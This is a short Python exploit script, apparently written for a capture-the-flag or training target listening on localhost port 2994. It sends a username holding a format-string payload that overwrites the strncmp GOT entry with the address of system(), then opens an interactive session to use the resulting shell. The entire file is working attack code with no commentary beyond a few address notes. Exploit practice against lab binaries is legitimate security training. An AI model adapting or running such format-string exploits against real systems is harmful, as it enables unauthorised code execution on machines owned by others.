import socket
import struct
import telnetlib

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",2994))
ip , port = s.getsockname() 
t = telnetlib.Telnet()
t.sock = s

def read_until(check):
        buffer = ''
        while check not in buffer:
                buffer += s.recv(1)
        return buffer

strncmpGot = struct.pack("I",0x804a1a8) #system 0xb7ecffb0
strncmpGot2 = struct.pack("I",0x804a1a8 + 2) #system 0xb7ecffb0

hostname = ip + ":" + str(port)
padding = "A"*(24-len(hostname))
username = padding +  strncmpGot + strncmpGot2 + "%17$65407x %17$08n" + "%18$47163x %18$08n"
login = "test"

print(read_until("$ "))
s.send("username " + username + "\n")
print(read_until("$ "))
s.send("login " + login + "\n")
print(read_until("$ "))

t.interact()
